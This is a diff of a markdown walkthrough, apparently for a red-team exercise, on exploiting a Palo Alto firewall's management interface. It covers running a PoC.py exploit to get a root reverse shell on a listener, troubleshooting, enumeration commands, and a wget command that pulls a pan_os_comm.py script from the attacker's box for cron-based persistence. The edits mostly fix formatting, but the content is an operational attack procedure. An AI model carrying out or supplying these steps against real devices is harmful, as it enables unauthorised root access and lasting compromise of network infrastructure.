@@ -211,31 +211,30 @@ KG+Vs7e5$dF4
 ### Section 2. Execute the PoC Script
 
 1. In one of the empty terminal panes, execute the PoC.py script to trigger the exploit:
-   	`python PoC.py https://<ip_of_palo_management_interface> <ip_address_of_attack_box> <port_of_initial_listener>`
+   `python PoC.py https://<ip_of_palo_management_interface> <ip_address_of_attack_box> <port_of_initial_listener>`
 2. Watch the initial listener pane to ensure it catches the callback from the exploit.
-   	If you see the following, you have successfully exploited the Palo Alto and now have a limited bash shell into the root of the system:
-	![image](https://github.com/user-attachments/assets/0d3b2d49-fe66-4dcb-80da-51204efebfbc)
+   If you see the following, you have successfully exploited the Palo Alto and now have a limited bash shell into the root of the system:
+   ![image](https://github.com/user-attachments/assets/0d3b2d49-fe66-4dcb-80da-51204efebfbc)
 
-   	If you do not see the following, its time to troubleshoot.
-   	Troubleshooting steps:
-   	1. Ensure you are using the correct IP addresses and ports in your listeners and exploit arguments
-   	2. Ensure there is routing to the Palo Management Interface.
-   	3. Ensure you copied your exploit script over correctly
-   	4. If all else fails, find a Sassy Panda SME and pray they have the answers :-)
-
-
-
+   If you do not see the following, its time to troubleshoot.
+   Troubleshooting steps:
+   1. Ensure you are using the correct IP addresses and ports in your listeners and exploit arguments
+   2. Ensure there is routing to the Palo Management Interface.
+   3. Ensure you copied your exploit script over correctly
+   4. If all else fails, find a Sassy Panda SME and pray they have the answers :-)
 
 ## Phase 2: Palo Persistence
 
 Once you are in the Palo Alto's bash shell, remember that this shell has limited functionality. **Features like the tab key for autocompletion and the up/down arrow keys won’t work.** The first priority is to establish persistence using a cron job and the pan_os_comm.py script you created earlier.
 
 1. Start by running some basic enumeration commands to get a sense of your current environment on the machine.
-   ```
-   whoami (response should be "root")
-   pwd
-   ls
-   ```
+
+```bash
+whoami (response should be "root")
+pwd
+ls
+```
+
 2. Next, import the pan_os_comm.py script from your attack machine, where it is being hosted via the web server.
    `wget -O /usr/local/bin/pan_os_comm.py http://<IP_of_your_attack_box>:<port>/pan_os_comm.py`
 
